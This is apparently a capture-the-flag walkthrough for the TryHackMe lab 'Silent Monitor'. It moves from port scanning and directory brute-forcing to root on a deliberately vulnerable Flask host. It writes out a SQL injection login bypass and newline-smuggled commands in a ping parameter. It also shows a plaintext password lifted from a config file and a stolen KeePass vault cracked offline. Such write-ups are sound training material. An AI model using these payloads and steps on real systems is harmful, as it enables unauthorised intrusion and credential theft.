# [Silent Monitor](https://tryhackme.com/room/silent-monitor)

## Enumerate a running internal service, exploit a vulnerable web application, pivot through the system, and crack your way to root.

# Introduction

## Green Lights, Dark Corners

CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.

The portal is up. The services show green. The audit log looks clean.

But clean logs can be written by anyone.

Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.

### What is the content of user.txt?

1. Port scan

Start with a full TCP port scan against the target to see what's actually exposed.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 eb:00:99:a7:4e:a3:1b:c2:cf:1e:da:a6:d9:b2:c1:5f (ECDSA)
|_  256 26:10:d6:e7:8a:1e:7a:40:2c:7c:df:32:52:f5:9a:47 (ED25519)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: CorpNet \xE2\x80\x94 Network Operations Centre
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Content discovery

Browsing to `http://<TARGET_IP>:5050/` shows a public-facing "CorpNet - Network Operations Centre" landing page. Since this looks like a custom application, run a directory brute-force to find any hidden or unlinked paths.

```bash
feroxbuster -u http://<TARGET_IP>:5050 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --status-codes 200
```

**Results:**

```
200      GET      370l      980w     9259c http://<TARGET_IP>:5050/
200      GET      264l      912w     8770c http://<TARGET_IP>:5050/internal
```

A single interesting path turns up: `/internal`. This is presumably the "secret dashboard" hinted at in the room's introduction.

3. Authentication bypass on the internal portal

Navigating to `http://<TARGET_IP>:5050/internal` presents a login page, clearly meant for NOC staff only. Since the backend is Flask/Python with what looks like a hand-written login query, it's worth testing for classic SQL injection.

Submitting the following as the **username** field bypasses the login entirely:

```sql
' OR 1==1 --
```

This comments out the rest of the WHERE clause in the backend SQL query and forces the authentication check to always evaluate true, logging us in as the first user in the database without needing valid credentials.

4. Command injection via the connectivity probe

Once inside `/internal`, there's a health-check utility at `http://<TARGET_IP>:5050/internal/health` labelled **CONNECTIVITY PROBE**, which asks for a **TARGET HOSTING OR IP ADDRESS**. This is almost certainly just shelling out to a system `ping`/`traceroute` command with the supplied input.

Intercept the request in Burp Suite and inject a newline-separated command into the `target` parameter. URL-encoding a newline after the IP lets a second command ride along on its own line:

```
target=127.0.0.1%0awhoami
```

Sending this returns the output of `whoami` alongside the expected ping results, confirming the injection works and that the web app is running as a low-privileged local service account.

[SCREEN01]

5. Confirming injection and listing files

With command injection confirmed, list the contents of the application's working directory to see what else is on disk:

```
target=127.0.0.1%0als
```

**Results:**

```
app.py
netops.db
secret.config
templates
```

`app.py` is presumably the Flask source itself, `netops.db` is likely the backing SQLite database for the login page exploited above, and `secret.config` stands out as worth reading immediately.

6. Reading the configuration file

```
target=127.0.0.1%0acat secret.config
```

**Results**

```
# netops application config
# generated: 2026-01-03

[database]
path    = /opt/netops/netops.db
timeout = 5

[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log

[auth]
session_lifetime = 1800

# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!

[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
```

This confirms the "cutting corners" tip from the introduction: a service-account password is sitting in plaintext in a config file that should never have been world-readable, with a TODO comment admitting it needs to be moved to a proper secrets manager. The `[backup_agent]` block gives us a username and a password. Worth trying directly against SSH.

7. SSH in as sysadmin

```bash
ssh sysadmin@<TARGET_IP>
```

When prompted, supply the password recovered from `secret.config`.

The credentials work, and we land a shell as the sysadmin local user.

8. Reading the flag

```bash
cat user.txt
```

[SCREEN02]

---

### What is the content of root.txt?

1. Discovering the backup share

As `sysadmin`, poke around the filesystem for anything related to the "backup agent" service account mentioned in `secret.config`. A `/backups` directory turns up:

```bash
ls -la /backups
```

**Results:**

```
-rw-r--r-- 1 sysadmin sysadmin  286 May 19 03:36 README.txt
-rw------- 1 sysadmin sysadmin 2439 May 19 03:34 infrastructure.kdbx
```

`infrastructure.kdbx` is a KeePass password database. A vault of credentials, likely including the `root` password, protected by a master password that isn't written down anywhere on disk.

2. Exfiltrating the vault

Pull the `.kdbx` file back to the attacking machine so it can be attacked offline:

```bash
scp sysadmin@<TARGET_IP>:backups/infrastructure.kdbx .
```

3. Cracking the master password

Convert the KeePass database into a crackable hash format and run it through John with a standard wordlist:

```bash
keepass2john infrastructure.kdbx > hash
john --format=KeePass hash
```

The master password is weak enough to be sitting in `rockyou.txt`.

3. With the master password in hand, open the vault:

```bash
keepassxc-cli ls infrastructure.kdbx
```

**Results:**

```
Root User Password - Sensitive
General/
Windows/
Network/
Internet/
eMail/
Homebanking/
Recycle Bin/
```

4. Extracting the root credentials

The top-level entry `Root User Password - Sensitive` is exactly what it sounds like. Pull it out with:

```bash
keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"
```

**Results:**

```
Title: Root User Password - Sensitive
UserName: root
Password: S3cur3P4ss0nK33p4ss
URL: https://keepass.info/
Notes: root user password, remember to change later.
Uuid: {ab5192bf-d112-1141-853c-3c99d69d5cae}
Tags:
```

5. Escalating to root

Back on the target as `sysadmin`, switch user with the recovered password:

```bash
su
ls /root
cat /root/root.txt
```

[SCREEN03]
